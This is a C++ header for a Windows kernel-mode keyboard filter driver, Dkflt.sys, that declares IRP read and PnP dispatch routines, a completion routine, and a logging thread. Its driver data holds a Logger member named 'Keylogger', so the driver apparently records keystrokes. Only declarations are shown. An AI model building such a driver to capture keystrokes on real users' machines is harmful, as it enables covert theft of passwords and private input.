//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: Dkflt.hpp
// 
// Creator: 0xlay
// 
// Environment: Kernel mode only
//
// Module: Dkflt.sys
//
//------------------------------------------------------------------------------

#pragma once

#include <wdm.h>
#include <ntddkbd.h>
#include "KeEvent.hpp"
#include "Logger.hpp"


////////////////////////////////////////////////////////////////////////////////
//
// Dispatching functions
//
////////////////////////////////////////////////////////////////////////////////

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DkfltUnload;
DRIVER_ADD_DEVICE DkfltAddDevice;

__drv_dispatchType(IRP_MJ_READ)
DRIVER_DISPATCH DkfltReadDispatch;

__drv_dispatchType(IRP_MJ_PNP)
DRIVER_DISPATCH DkfltPnpDispatch;

DRIVER_DISPATCH DkfltPassDispatch;

EXTERN_C_END

__drv_maxIRQL(DISPATCH_LEVEL)
NTSTATUS
ReadCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject,
                      _In_ PIRP Irp,
                      _In_opt_ PVOID Context);

////////////////////////////////////////////////////////////////////////////////
//
// Structures
//
////////////////////////////////////////////////////////////////////////////////

typedef struct _DRIVER_DATA
{
    PUNICODE_STRING RegistryPath{};
    PDRIVER_OBJECT DriverObject{};

    HANDLE LoggingThread{};
    bool ThreadIsRun{};
    Logger* Keylogger{};
    KeEvent* LogEvent{};
    KEYBOARD_INPUT_DATA key{};
} DRIVER_DATA, *PDRIVER_DATA;

////////////////////////////////////////////////////////////////////////////////
//
// Global data
//
////////////////////////////////////////////////////////////////////////////////

extern DRIVER_DATA g_DriverData; // Global driver data

////////////////////////////////////////////////////////////////////////////////
//
// System thread routines
//
////////////////////////////////////////////////////////////////////////////////

EXTERN_C_START

KSTART_ROUTINE LoggingThreadtRoutine;

EXTERN_C_END